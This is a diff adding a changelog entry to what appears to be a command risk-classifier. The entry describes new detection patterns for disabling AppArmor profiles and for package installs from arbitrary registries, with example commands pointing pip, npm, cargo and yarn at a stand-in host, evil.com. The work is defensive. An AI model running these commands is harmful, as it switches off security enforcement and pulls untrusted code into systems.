@@ -4,6 +4,48 @@
 
 (no entries — next release window)
 
+## [1.10.140] - 2026-05-03
+
+**Two more patterns**: `apparmor-disable` (high) +
+`pkg-install-untrusted-index` (medium). The first closes
+the AppArmor-disable threat surface that was only partially
+covered (via `systemctl mask apparmor`); the second closes
+a supply-chain attack vector via package manager index
+override.
+
+### Added
+- **`PATTERN_CATALOG.high`** entry `apparmor-disable`. Catches
+  `aa-disable <profile>`, `aa-complain <profile>`, and
+  `apparmor_parser -R <profile>` — all three move profiles
+  out of enforcement. Same threat as `systemctl mask
+  apparmor` but via the AppArmor CLI rather than systemd.
+  `aa-status` and read forms (`cat`, `systemctl status`)
+  stay LOW.
+
+- **`PATTERN_CATALOG.medium`** entry `pkg-install-untrusted-index`.
+  Catches package-manager install commands pointing at an
+  arbitrary HTTP(S) host:
+  - `pip install --extra-index-url http://evil.com/ pkg`
+  - `pip install --index-url https://evil.com/simple/ pkg`
+  - `pip install --trusted-host evil.com pkg`
+  - `npm install --registry http://evil.com/ pkg`
+  - `cargo install --index http://evil.com/ pkg`
+  - `yarn add --registry http://evil.com/ pkg`
+  Bypasses the configured registry's auth + supply-chain
+  controls. Operators legitimately use private registries —
+  hence MEDIUM. `file://` URLs (local artifacts) stay LOW.
+
+- **`tests/risk-classifier.test.js`**: 4 new `it()` cases —
+  attack assertions for both rules + regression cases. Suite
+  stays at 176. Risk-classifier file 238 → 242 cases.
+
+### Catalog totals
+- Critical: 25 patterns (+0)
+- High: 40 patterns (+1: apparmor-disable)
+- Medium: 20 patterns (+1: pkg-install-untrusted-index)
+- **Total: 86 → 88** (effective; daemon will report after
+  restart)
+
 ## [1.10.139] - 2026-05-03
 
 **`system-files` / `sed-system-file-edit` /
